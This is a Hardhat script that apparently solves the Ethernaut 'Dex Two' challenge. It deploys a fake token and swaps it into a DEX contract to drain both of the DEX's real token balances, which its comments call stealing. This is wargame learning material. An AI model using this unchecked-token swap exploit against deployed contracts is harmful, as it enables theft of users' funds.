// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
import { BigNumber } from "ethers";
import { parseEther } from "ethers/lib/utils";
import { ethers } from "hardhat";

async function main() {
  const dex = await ethers.getContractAt("DexTwo", "0xc413D96befc16A8C8858ed371B92595E66a7c87C")
  const firstTokenAddress = await dex.token1()
  const secondTokenAddress = await dex.token2()
  const firstToken = await ethers.getContractAt("SwappableTokenTwo", firstTokenAddress)
  const secondToken = await ethers.getContractAt("SwappableTokenTwo", secondTokenAddress)
  const [attacker] = await ethers.getSigners()

  // check balance function
  const checkBalance = async (address: string): Promise<BigNumber[]> => {
    const firstTokenBalance = await firstToken.balanceOf(address)
    const secondTokenBalance = await secondToken.balanceOf(address)
    console.log(firstTokenBalance, secondTokenBalance)
    return [firstTokenBalance, secondTokenBalance]
  }

  // deploy attack token
  const AttackToken = await ethers.getContractFactory("SwappableTokenTwo")
  const attackToken = await AttackToken.connect(attacker).deploy(dex.address, "Attack Token", "AT", 400)
  await attackToken.deployed()
  console.log("Attack token deployed")

  // approve big number
  const approveTx = await attackToken.connect(attacker)["approve(address,uint256)"](dex.address, parseEther("1"))
  await approveTx.wait(4)
  console.log("1 eth approved")

  // steal first token
  // transfer 100 attack token to Dex
  const transferATx = await attackToken.connect(attacker).transfer(dex.address, 100)
  await transferATx.wait(4)
  console.log("100 token sent")
  // do swap with attack token -> first token
  const swapATx = await dex.connect(attacker).swap(attackToken.address, firstToken.address, 100)
  await swapATx.wait(4)
  console.log("successfully swap 100 attack token -> first token")

  // steal second token
  // do swap with attack token -> second token
  const swapBTx = await dex.connect(attacker).swap(attackToken.address, secondToken.address, 200)
  await swapBTx.wait(4)
  console.log("successfully swap 100 attack token -> second token")

  // check dex balance
  await checkBalance(dex.address)
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
